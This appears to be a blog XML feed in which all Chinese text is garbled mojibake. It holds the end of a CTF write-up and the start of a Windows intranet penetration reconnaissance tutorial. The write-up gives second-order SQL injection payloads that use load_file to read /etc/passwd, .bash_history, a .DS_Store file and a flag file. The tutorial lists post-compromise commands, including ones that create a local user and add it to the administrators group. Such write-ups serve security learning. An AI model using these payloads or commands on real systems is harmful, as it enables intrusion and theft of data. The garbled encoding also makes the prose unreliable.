å¯ä»¥å‘ç°ï¼Œåªæœ‰categotyå­—æ®µæ˜¯å­˜åœ¨äºŒæ¬¡æ³¨å…¥çš„ç‚¹çš„ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°è¯•ä¸€ä¸‹</p><p>è¿™é‡Œå°è¯•ä¸€ä¸‹æ’å…¥æŸ¥è¯¢database()</p><p>è¿™é‡Œè¦æ³¨æ„ä¸€ç‚¹æˆ‘ä»¬çš„æ’å…¥æ–¹å¼æœ‰ç‚¹ç‰¹æ®Š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#writeç•Œé¢ä¼ å‚<br>title=test&amp;category=test&#x27;,content=database(),/*&amp;content=test<br><br>#commentè·¯ç”±<br>content=*/#&amp;bo_id=7<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œè¦è¿™ä¹ˆå†™çš„åŸå› </p><p>æˆ‘ä»¬è¿™ä¹ˆå†™åä»–çš„sqlè¯­å¥å°±å˜æˆäº†è¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">insert into comment set category = &#x27;test&#x27;,content=database(),/*&#x27;content=&#x27;*/#&#x27;,bo_id=&#x27;7&#x27;<br></code></pre></td></tr></table></figure><p>emmmä½†æ˜¯æœ‰ä¸€ä¸ªå¾ˆç¥å¥‡çš„é—®é¢˜ï¼Œåé¢åº”è¯¥æ˜¯è¢«æ³¨é‡Šäº†æ˜¯æ’å…¥ä¸äº†çš„ï¼Œä½†æ˜¯ä»–å´æ’å…¥è¿›å»äº†ã€‚ã€‚ã€‚</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151704619.png" alt="image-20240525231101246"></p><p>ç„¶åå°±èƒ½åœ¨ç•™è¨€çš„åœ°æ–¹çœ‹åˆ°æ•°æ®åº“åå­—ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥ç»§ç»­è¿›è¡Œå…¶ä»–æŸ¥è¡¨æ“ä½œ</p><p>ç„¶åå»çœ‹ä¸€ä¸‹&#x2F;etc&#x2F;passwd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#writeç•Œé¢ä¼ å‚<br>title=test&amp;category=test&#x27;,content=((select(load_file(&quot;/etc/passwd&quot;)))),/*&amp;content=test<br><br>#commentè·¯ç”±<br>content=*/#&amp;bo_id=7<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704620.png" alt="image-20240525233744085"></p><p>çœ‹åˆ°åœ¨webç›®å½•åœ¨homeç›®å½•ä¸‹</p><p>ç„¶åå†å»è¯»ä¸€ä¸‹å†å²æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#writeç•Œé¢ä¼ å‚<br>title=test&amp;category=test&#x27;,content=((select(load_file(&quot;/home/www/.bash_history&quot;)))),/*&amp;content=test<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704621.png" alt="image-20240525234012563"></p><p>å¯çŸ¥tmpç›®å½•ä¸‹è¿˜æœ‰DS_Storeæ–‡ä»¶ï¼Œæˆ‘ä»¬å»è¯»ä¸€ä¸‹</p><blockquote><p>.DS_Store æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">title=test&amp;category=test&#x27;,content=((select(load_file(&quot;/tmp/html/.DS_Store&quot;)))),/*&amp;content=test<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704622.png" alt="image-20240525234301885"></p><p>ä½†æ˜¯ä¹±ç è¯»ä¸äº†å…ˆè½¬æˆåå…­è¿›åˆ¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">title=test&amp;category=test&#x27;,content=((select(hex(load_file(&quot;/tmp/html/.DS_Store&quot;))))),/*&amp;content=test<br><br><br>#ç»“æœ<br>00000001427564310000100000000800000010000000040A000000000000000000000000000000000000000000000800000008000000000000000000000000000000000000000002000000000000000B000000010000100000730074007200610070496C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B000000090062006F006F007400730074007200610070496C6F63626C6F62000000100000004600000028FFFFFFFFFFFF00000000000B0063006F006D006D0065006E0074002E007000680070496C6F63626C6F6200000010000000CC0000002800000001FFFF000000000003006300730073496C6F63626C6F62000000100000015200000028FFFFFFFFFFFF0000000000190066006C00610067005F0038003900340036006500310066006600310065006500330065003400300066002E007000680070496C6F63626C6F6200000010000001D800000028FFFFFFFFFFFF0000000000050066006F006E00740073496C6F63626C6F62000000100000004600000098FFFFFFFFFFFF0000000000090069006E006400650078002E007000680070496C6F63626C6F6200000010000000CC0000009800000002FFFF000000000002006A0073496C6F63626C6F62000000100000015200000098FFFFFFFFFFFF000000000009006C006F00670069006E002E007000680070496C6F63626C6F6200000010000001D800000098FFFFFFFFFFFF000000000009006D007900730071006C002E007000680070496C6F63626C6F62000000100000004600000108FFFFFFFFFFFF00000000000600760065006E0064006F0072496C6F63626C6F6200000010000000CC00000108FFFFFFFFFFFF00000000000C00770072006900740065005F0064006F002E007000680070496C6F63626C6F62000000100000015200000108FFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000080B000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000002000000001000000400000000100000080000000010000010000000001000002000000000100000400000000000000000100001000000000010000200000000001000040000000000100008000000000010001000000000001000200000000000100040000000000010008000000000001001000000000000100200000000000010040000000000001008000000000000101000000000000010200000000000001040000000000000108000000000000011000000000000001200000000000000140000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000100B000000450000040A000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000104445344420000000100000000000000000000000000000000000000000000000200000020000000600000000000000001000000800000000100000100000000010000020000000000000000020000080000001800000000000000000100002000000000010000400000000001000080000000000100010000000000010002000000000001000400000000000100080000000000010010000000000001002000000000000100400000000000010080000000000001010000000000000102000000000000010400000000000001080000000000000110000000000000012000000000000001400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<br><br></code></pre></td></tr></table></figure><p>ç„¶åå†hexè§£ç ä¸€ä¸‹æ‹¿åˆ°ä¸€ä¸ªflag_8946e1ff1ee3e40f.phpï¼Œå»è¯»ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶æ‹¿åˆ°flag</p><p><img src="http://cdn.clown2024.cn/202407151704623.png" alt="image-20240525234731502"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">title=test&amp;category=test&#x27;,content=((select(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)))),/*&amp;content=test<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf åˆ·é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¸—é€ä½“ç³»å»ºè®¾-ä¿¡æ¯æœé›†</title>
      <link href="/2024/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2024/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><p>å½“æ¸—é€æµ‹è¯•äººå‘˜é€šè¿‡ Web æ¸—é€æˆ–å…¶ä»–æ–¹å¼è·å¾—æœåŠ¡å™¨ä¸»æœºçš„æƒé™åï¼Œéœ€è¦ä»¥è¯¥ä¸»æœºä¸ºè·³æ¿ï¼Œå¯¹å…¶å†…ç½‘ç¯å¢ƒè¿›è¡Œæ¸—é€ã€‚å¯¹äºæ”»é™·çš„ç¬¬ä¸€å°ä¸»æœºï¼Œå…¶åœ¨å†…ç½‘ä¸­æ‰€å¤„çš„ç½‘ç»œä½ç½®å½“å‰ç™»å½•çš„ç”¨æˆ·ã€è¯¥ç”¨æˆ·æœ‰ä»€ä¹ˆæ ·çš„æƒé™ã€å…¶æ“ä½œç³»ç»Ÿä¿¡æ¯ã€ç½‘ç»œé…ç½®ä¿¡æ¯åŠå½“å‰è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯ç­‰éƒ½æ˜¯æœªçŸ¥çš„ï¼Œè¿™å°±éœ€è¦æµ‹è¯•äººå‘˜ä»¥å½“å‰ä¸»æœºä¸ºä¸­å¿ƒè¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚</p><h1 id="æœ¬æœºåŸºç¡€ä¿¡æ¯æœé›†"><a href="#æœ¬æœºåŸºç¡€ä¿¡æ¯æœé›†" class="headerlink" title="æœ¬æœºåŸºç¡€ä¿¡æ¯æœé›†"></a>æœ¬æœºåŸºç¡€ä¿¡æ¯æœé›†</h1><p><strong>æŸ¥çœ‹å½“å‰ç”¨æˆ·ã€æƒé™</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">whoami /all<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å½“å‰ç”¨æˆ·ä»¥åŠå½“å‰ç”¨æˆ·æ‰€å¤„çš„ç”¨æˆ·ç»„ã€æ‰€æ‹¥æœ‰çš„ç‰¹æƒç­‰ä¿¡æ¯ï¼Œæµ‹è¯•<br>äººå‘˜å¯ä»¥å¯¹å½“å‰ç”¨æˆ·æ‰€æ‹¥æœ‰çš„ç‰¹æƒæœ‰ä¸€ä¸ªå¤§è‡´çš„äº†è§£ï¼Œå¹¶ç»¼åˆåˆ¤æ–­æ˜¯å¦éœ€è¦æå‡æƒé™ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151745068.png" alt="image-20240318094322829"></p><p><img src="http://cdn.clown2024.cn/202407151745069.png" alt="image-20240318094352206"></p><p><strong>æŸ¥çœ‹ç½‘ç»œé…ç½®ä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ipconfig /all<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å½“å‰ä¸»æœºçš„ç½‘ç»œé…ç½®æƒ…å†µï¼ŒåŒ…æ‹¬ä¸»æœºçš„IP åœ°å€ã€ä¸»æœºåã€å„ç½‘ç»œé€‚é…å™¨çš„ä¿¡æ¯å¯ä»¥ä»ä¸­åˆ¤æ–­å‡ºå½“å‰ä¸»æœºæ‰€å¤„çš„å†…ç½‘ç½‘æ®µ</p><p><img src="http://cdn.clown2024.cn/202407151745070.png" alt="image-20240318094527225"></p><p><strong>æŸ¥çœ‹ä¸»æœºè·¯ç”±ä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">route print<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745071.png" alt="image-20240318094752859"></p><p>åœ¨è·¯ç”±è¡¨ä¸­çš„â€œç½‘ç»œç›®æ ‡â€éƒ½æ˜¯ä¸»æœºå¯ä»¥ç›´æ¥è®¿é—®åˆ°çš„ï¼Œæµ‹è¯•äººå‘˜åœ¨åç»­çš„æ¨ªå‘æ¸—é€ä¸­å¯ä»¥å°è¯•æ¢æµ‹ç›¸å…³åœ°å€æ®µçš„å­˜æ´»ä¸»æœºã€‚</p><p><strong>æŸ¥çœ‹æ“ä½œç³»ç»Ÿä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">systeminfo<br>systeminfo | findstr /B /C:&quot;0S Name&quot; /C:&quot;0S Version&quot; # æŸ¥çœ‹æ“ä½œç³»ç»ŸåŠç‰ˆæœ¬<br>systeminfo | findstr /B /C:&quot;0S åç§°&quot; /C:&quot;0S ç‰ˆæœ¬&quot; #æŸ¥çœ‹æ“ä½œç³»ç»ŸåŠç‰ˆæœ¬<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745072.png" alt="image-20240318095114506"></p><p><strong>æŸ¥çœ‹ç«¯å£è¿æ¥ä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">netstat -ano<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745073.png" alt="image-20240318133421621"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰å“ªäº›å¤–éƒ¨ä¸»æœºä¸æœ¬æœºå»ºç«‹è¿æ¥ï¼Œä»è¿™é‡Œå¯ä»¥æ”¶é›†å†…ç½‘åœ°å€æ®µçš„ä¿¡æ¯ï¼Œå¦‚æœæœ‰å†…ç½‘ä¸»æœºè¿æ¥å°±ä¼šæ˜¾ç¤ºåœ°å€ä¿¡æ¯ï¼Œæˆ‘è¿™é‡Œè¿ä¸ªç™¾åº¦ç½‘ç«™æ¥çœ‹çœ‹å¤–éƒ¨åœ°å€çš„å˜åŒ–</p><p><img src="http://cdn.clown2024.cn/202407151745074.png" alt="image-20240318133826701"></p><p><strong>æŸ¥çœ‹å½“å‰ä¼šè¯åˆ—è¡¨</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net session<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745075.png" alt="image-20240318134119130"></p><p>æŸ¥çœ‹å½“å‰ä¸»æœºä¸æ‰€è¿æ¥çš„å®¢æˆ·ç«¯ä¸»æœºä¹‹é—´çš„ä¼šè¯ï¼Œæˆ‘è¿™é‡Œè¿˜æ²¡æœ‰å»ºç«‹è¿æ¥</p><p><strong>æŸ¥çœ‹å½“å‰ç½‘ç»œå…±äº«ä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net use<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å½“å‰ä¸»æœºä¸å…¶ä»–ä¸»æœºè¿œç¨‹å»ºç«‹çš„ç½‘ç»œå…±äº«è¿æ¥</p><p><img src="http://cdn.clown2024.cn/202407151745076.png" alt="image-20240318134359209"></p><p><strong>æŸ¥çœ‹å½“å‰è¿›ç¨‹ä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">tasklist<br>tasklist /SVC<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745077.png" alt="image-20240318134424067"></p><p><img src="http://cdn.clown2024.cn/202407151745078.png" alt="image-20240318134445449"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic process get Name,ProcessId,ExecutablePath<br></code></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤å¯ä»¥iæŸ¥è¯¢ä¸»æœºè¿›ç¨‹ä¿¡æ¯ï¼Œå¹¶è¿‡æ»¤å‡ºè¿›ç¨‹çš„è·¯å¾„ã€åç§°å’ŒPID<img src="http://cdn.clown2024.cn/202407151745079.png" alt="image-20240318134935916"></p><p>WMIC æ˜¯å¾®è½¯ä¸º Windowsç®¡ç†è§„èŒƒ(Windows Management Instrumentationï¼ŒWMI)æä¾›çš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œæä¾›ä»å‘½ä»¤è¡Œæ¥å£å’Œæ‰¹å¤„ç†è„šæœ¬æ‰§è¡Œç³»ç»Ÿç®¡ç†çš„æ”¯æŒã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic process where Name=&quot;conhost.exe&quot; get ExecutablePath<br></code></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤å¯ä»¥æŸ¥çœ‹æŒ‡å®šè¿›ç¨‹çš„è·¯å¾„ä¿¡æ¯</p><p><img src="http://cdn.clown2024.cn/202407151745080.png" alt="image-20240318135201960"></p><p><strong>æŸ¥çœ‹å½“å‰æœåŠ¡ä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic service get Caption, Name,PathName, StartName, State<br></code></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤æŸ¥çœ‹å½“å‰æ‰€æœ‰æœåŠ¡çš„ä¿¡æ¯ï¼Œå¹¶è¿‡æ»¤å‡ºæœåŠ¡çš„åç§°ã€è·¯å¾„ã€åˆ›å»ºæ—¶é—´ã€è¿è¡ŒçŠ¶æ€ä¿¡æ¯ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151745081.png" alt="image-20240318181750072"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic service where Name=&quot;themes&quot; get Caption,PathName,State<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æŒ‡å®šæœåŠ¡çš„ä¿¡æ¯ï¼Œå¹¶è¿‡æ»¤å‡ºæœåŠ¡åç§°ã€è·¯å¾„å’Œè¿è¡ŒçŠ¶æ€</p><p><img src="http://cdn.clown2024.cn/202407151745082.png" alt="image-20240318182232588"></p><p><strong>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /query /v /fo list<br></code></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤æŸ¥çœ‹å½“å‰ä¸»æœºä¸Šæ‰€æœ‰çš„è®¡åˆ’ä»»åŠ¡</p><p><img src="http://cdn.clown2024.cn/202407151745083.png" alt="image-20240318182513357"></p><p><strong>æŸ¥çœ‹è‡ªå¯ç¨‹åºä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic startup get Caption,Commandï¼ŒLocationï¼ŒUser<br></code></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤æŸ¥çœ‹å½“å‰ä¸»æœºä¸Šæ‰€æœ‰çš„è‡ªå¯ç¨‹åºä¿¡æ¯ï¼Œå¹¶è¿‡æ»¤å‡ºç¨‹åºåç§°ã€æ‰€æ‰§è¡Œçš„å‘½ä»¤ã€ç¨‹åºçš„è·¯å¾„æ‰€å±ç”¨æˆ·</p><p><img src="http://cdn.clown2024.cn/202407151745084.png" alt="image-20240318182709052"></p><p><strong>æŸ¥çœ‹ç³»ç»Ÿè¡¥ä¸å®‰è£…ä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic qfe get Caption,Description,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å½“å‰ä¸»æœºå®‰è£…çš„è¡¥ä¸åˆ—è¡¨ï¼Œå¹¶è¿‡æ»¤å‡ºè¡¥ä¸é“¾æ¥ã€åç§°ã€æè¿°ã€è¡¥ä¸ç¼–å·ä»¥åŠå®‰è£…æ—¶é—´ï¼›é€šå¸¸ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥æ ¹æ®ç›®æ ‡ä¸»æœºçš„æ“ä½œç³»ç»Ÿç‰ˆæœ¬å’Œç¼ºå°‘çš„è¡¥ä¸æ¥è¾…åŠ©åé¢çš„ææƒæ“ä½œã€‚</p><p><img src="http://cdn.clown2024.cn/202407151745085.png" alt="image-20240318214819594"></p><p><strong>æŸ¥çœ‹åº”ç”¨å®‰è£…ä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic product get Caption,Version<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745086.png" alt="image-20240318214855646"></p><p><strong>æŸ¥çœ‹æœ¬åœ°ç”¨æˆ·&#x2F;ç»„ä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user<br>net user &lt;username&gt; #æŸ¥çœ‹æŒ‡å®šç”¨æˆ·è¯¦ç»†ä¿¡æ¯<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745087.png" alt="image-20240318215359151"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net localgroup administrators #æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œæœ¬åœ°ç®¡ç†å‘˜ç»„ä¸­é™¤äº†æœ¬åœ°ç®¡ç†å‘˜ Administratorï¼Œè¿˜åŒ…å«åŸŸå…¨å±€ç»„clownï¼Œå…¶åœ¨è¯¥ä¸»æœºåŠ å…¥åŸŸæ—¶è‡ªåŠ¨è¢«æ·»åŠ åˆ°è®¡ç®—æœºæœ¬åœ°Administrators ç»„ä¸­ï¼Œæ‰€ä»¥Domain Admins ç»„æ‹¥æœ‰è¯¥è®¡ç®—æœºçš„ç®¡ç†æƒé™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„æœ¬åœ°ç”¨æˆ·åŠ å…¥åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„</p><p><img src="http://cdn.clown2024.cn/202407151745088.png" alt="image-20240318215328201"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user &lt;username&gt; &lt;password&gt; /add  #åˆ›å»ºæœ¬åœ°ç”¨æˆ·<br>net localgroup administrators &lt;username&gt; /add  #å°†ç”¨æˆ·åŠ å…¥æœ¬åœ°ç®¡ç†å‘˜ç»„<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å½“å‰ç™»é™†ç”¨æˆ·</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">query user<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745089.png" alt="image-20240318215825045"></p><h1 id="åŸŸå†…ä¿¡æ¯æœé›†"><a href="#åŸŸå†…ä¿¡æ¯æœé›†" class="headerlink" title="åŸŸå†…ä¿¡æ¯æœé›†"></a>åŸŸå†…ä¿¡æ¯æœé›†</h1><p><strong>åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸç¯å¢ƒ</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net config workstation<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745090.png" alt="image-20240324193823102"></p><p>æŸ¥çœ‹å½“å‰å·¥ä½œç«™çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬å½“å‰è®¡ç®—æœºåã€ç”¨æˆ·åã€ç³»ç»Ÿç‰ˆæœ¬ã€å·¥ä½œç«™ã€ç™»å½•çš„åŸŸç­‰</p><p><strong>æŸ¥çœ‹åŸŸç”¨æˆ·ä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user /domain  #æŸ¥çœ‹æ‰€æœ‰çš„åŸŸç”¨æˆ·<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745091.png" alt="image-20240324194158121"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user &lt;username&gt; /domain 